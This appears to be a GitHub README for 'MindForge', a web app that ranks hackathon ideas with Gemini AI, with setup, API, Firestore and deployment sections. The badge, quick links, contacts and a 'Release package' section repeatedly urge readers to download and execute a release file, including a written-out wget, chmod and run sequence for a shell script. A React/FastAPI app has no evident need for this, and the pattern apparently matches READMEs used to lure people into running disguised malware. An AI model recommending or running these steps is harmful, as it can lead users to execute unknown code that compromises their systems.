[![Releases - Download](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/geckogeckooo/MindForge/releases)

# MindForge: Real-time AI Idea Evaluation for Coding Clubs ⚙️🤖

![MindForge Hero](https://images.unsplash.com/photo-1518770660439-4636190af475?auto=format&fit=crop&w=1400&q=80)

A live platform that evaluates submitted ideas with Gemini AI, ranks entries on a real-time leaderboard, and drives rapid feedback during hackathons and club pitches. Built with React (Vite + Tailwind), FastAPI, and Firebase (Firestore + Auth). Designed for RVCE coding club events and adaptable to other campuses or meetups.

- Topics: ai, event-platform, fastapi, firestore, gemini-api, google-oauth, leaderboard, mobile-first, react, rvce, tailwindcss, vite

---

Table of contents
- Quick links
- What MindForge does
- Key features
- Architecture & flow
- Tech stack
- Setup — local dev
- Environment variables
- Release package (download & run)
- API quick reference
- Firestore data model
- Security & auth
- Testing
- Deployment
- Contributing
- Attribution & license

Quick links
- Releases: https://github.com/geckogeckooo/MindForge/releases (download the release file and execute it)

What MindForge does
- Let participants submit business or product ideas via a mobile-first web UI.
- Send idea text to Gemini AI for instant, structured feedback.
- Score submissions on multiple axes (feasibility, novelty, market fit).
- Update a live leaderboard that ranks teams and individuals during an event.
- Allow moderators to curate, pin, and export top entries for judging.

Key features
- Real-time feedback: AI evaluates ideas as users type or submit.
- Live leaderboard: Uses Firestore real-time listeners to update scores instantly.
- OAuth sign-in: Google OAuth for account creation and session management.
- Mobile-first UI: Built with Vite + React + Tailwind for fast first paint.
- Extensible evaluation: Add custom scoring rules or judge inputs.
- Export and reports: Export leaderboards and submissions as CSV or JSON.

Architecture & flow
![Architecture Diagram](https://images.unsplash.com/photo-1555066931-4365d14bab8c?auto=format&fit=crop&w=1200&q=80)

1. User signs in with Google OAuth from the React app.
2. The app posts idea data to FastAPI.
3. FastAPI validates request, sends the idea to Gemini API for evaluation.
4. FastAPI writes result + metadata to Firestore.
5. Frontend listens to Firestore collection updates and refreshes the leaderboard.

MindForge divides responsibilities:
- Frontend: UI, auth flows, submission form, live leaderboard.
- Backend: API, AI integration, validation, score normalization.
- Database: Firestore (real-time), collections for users, submissions, scores.
- Cloud functions or scheduled jobs: Score aggregation, exports.

Tech stack
- Frontend: React (Vite), Tailwind CSS, react-query, Firebase SDK
- Backend: FastAPI, Uvicorn, Pydantic
- Database: Firebase Firestore (real-time)
- Auth: Firebase Auth with Google OAuth
- AI: Gemini API (request/response flow; server-side key usage)
- Dev tools: Docker (optional), Prettier, ESLint, PyTest

Setup — local dev

Prerequisites
- Node 18+
- Python 3.10+
- Firebase project
- Google Cloud project with Gemini API access and credentials
- Git

Clone
```bash
git clone https://github.com/geckogeckooo/MindForge.git
cd MindForge
```

Frontend
```bash
cd web
cp .env.example .env
# install
npm install
# dev
npm run dev
```
Open http://localhost:5173

Backend
```bash
cd api
python -m venv venv
source venv/bin/activate
pip install -r requirements.txt
cp .env.example .env
# run development server
uvicorn app.main:app --reload --port 8000
```
Open http://localhost:8000/docs for API docs (OpenAPI UI).

Local Firebase emulation (optional)
- Install Firebase CLI
- Run emulator for Firestore and Auth, update .env to point at emulator host.

Environment variables

Frontend (.env)
- VITE_FIREBASE_API_KEY=yourFirebaseApiKey
- VITE_FIREBASE_AUTH_DOMAIN=your-project.firebaseapp.com
- VITE_FIREBASE_PROJECT_ID=your-project-id
- VITE_API_BASE_URL=http://localhost:8000

Backend (.env)
- FIREBASE_PROJECT_ID=your-project-id
- FIREBASE_CLIENT_EMAIL=...
- FIREBASE_PRIVATE_KEY="-----BEGIN PRIVATE KEY-----\n...\n-----END PRIVATE KEY-----"
- GEMINI_API_KEY=sk-....
- GOOGLE_OAUTH_CLIENT_ID=...
- GOOGLE_OAUTH_CLIENT_SECRET=...
- FIREBASE_DATABASE_EMULATOR_HOST=localhost:8080 (only for emulator)

Release package (download & run)
- Download the latest release from this page and execute the included script: https://github.com/geckogeckooo/MindForge/releases
- The release includes build artifacts and an installer script or runnable binary. Download the asset that matches your platform and run it from a shell:
```bash
# example for a Unix release asset
wget https://github.com/geckogeckooo/MindForge/releases/download/v1.2.0/mindforge-release-linux.sh
chmod +x mindforge-release-linux.sh
./mindforge-release-linux.sh
```
The release file needs to be downloaded and executed to install the packaged build and local helpers.

API quick reference
- POST /submit
  - Body: { title, description, tags, userId }
  - Action: validate, forward to Gemini, write to Firestore, return normalized score
- GET /submissions
  - Query: ?limit=&orderBy=
  - Returns paginated list of submissions
- POST /judge/{submissionId}
  - Body: { scores: { feasibility, novelty, market }, comments }
  - Action: attach judge input and update aggregate score
- GET /leaderboard
  - Returns current ranking with pagination
- Health: GET /health

Request/response format follows Pydantic models in api/app/schemas.py.

Firestore data model
- users (docId = uid)
  - displayName, email, photoURL, role (participant/moderator/admin)
- submissions (docId)
  - title, description, tags[], userId, createdAt, status
  - aiFeedback: { raw, pros, cons, scoreVector }
  - aggregatedScores: { feasibility, novelty, market, overall }
- judges (docId)
  - userId, submissionsJudged[], lastActive
- leaderboard (computed view)
  - snapshot generated from aggregatedScores

Security & auth
- Use Firebase Auth with Google OAuth client. Only server-side code holds Gemini API key.
- Enforce Firestore security rules:
  - Participants can create their submission, read public submissions.
  - Moderators can edit statuses and pin entries.
  - Admins can export and manage events.
- Validate all input server-side before calling Gemini. Sanitize strings.

AI integration tips
- Call Gemini from the backend to avoid exposing keys in the client.
- Send structured prompts with clear evaluation axes. Example:
  - "Evaluate this idea on feasibility, novelty, and market fit. Return JSON with {feasibility:0-10, novelty:0-10, market:0-10, comments:[pros,cons], reasons:[] }"
- Store both raw AI output and mapped numeric scores.
- Normalize scores from different runs for fair leaderboard placement.

Testing
- Frontend: run unit tests with vitest / react-testing-library:
```bash
cd web
npm run test
```
- Backend: run pytest
```bash
cd api
pytest -q
```
- Integration: use Firebase emulator to test auth and Firestore interactions.

Deployment
- Frontend: build with Vite then host on Firebase Hosting or Vercel.
```bash
cd web
npm run build
# deploy to Firebase Hosting
firebase deploy --only hosting
```
- Backend: build and containerize FastAPI, deploy to Cloud Run or any host that supports ASGI apps.
- Use environment variables in your cloud provider. Keep Gemini API key in secret manager.

CI/CD suggestions
- Run linters and tests on push to main.
- Build frontend artifact and attach to release pipeline.
- Deploy backend to staging on merged PRs, promote to production on release tags.

Event operator flow (how to run a session)
1. Create an event in the admin panel.
2. Share the event link with participants.
3. Participants sign in and submit ideas.
4. MindForge posts instant AI feedback and a temporary score.
5. Judges add manual scores, which update aggregates.
6. The leaderboard updates live. Moderators can pin finalists for final judging.
7. Export winners to CSV or JSON for documentation.

Contributing
- Fork the repo, open a feature branch, and submit a pull request.
- Follow the code style: Prettier for frontend, Black for Python.
- Add tests for new features. Describe changes in PR.
- Assign issues using labels: good-first-issue, help-wanted, enhancement.

Project structure (high level)
- /web — React app (Vite + Tailwind)
- /api — FastAPI backend
- /scripts — helper scripts for local setup and release packaging
- /docs — architecture diagrams, event guides
- firebase.json — hosting and rules
- README.md — this file

Assets & images
- Use license-free imagery for event and AI sections. Example sources: Unsplash (developer-friendly photography), simpleicons for logos.
- Host custom screenshots under /docs/screenshots and link in GitHub Pages or release assets for distribution.

Attribution & license
- This project uses open-source libraries. Check individual package licenses.
- Default license: MIT (update LICENSE file if you change)

Contacts & maintainers
- Repo: https://github.com/geckogeckooo/MindForge
- Releases: https://github.com/geckogeckooo/MindForge/releases (download the release file and execute it)
- Open an issue for bugs or feature requests. Mention the event name and steps to reproduce.

Quick commands summary
- Start frontend: npm run dev (in /web)
- Start backend: uvicorn app.main:app --reload --port 8000 (in /api)
- Run tests: npm run test (frontend), pytest (backend)
- Export leaderboard: GET /leaderboard?format=csv

Badges
[![Build Status](https://img.shields.io/github/actions/workflow/status/geckogeckooo/MindForge/ci.yml?branch=main&logo=github)](https://github.com/geckogeckooo/MindForge/actions)
[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)

Screenshots
![Mobile UI](https://images.unsplash.com/photo-1518972559570-1d3f96c9f3b7?auto=format&fit=crop&w=800&q=60)
![Leaderboard](https://images.unsplash.com/photo-1498050108023-c5249f4df085?auto=format&fit=crop&w=1200&q=60)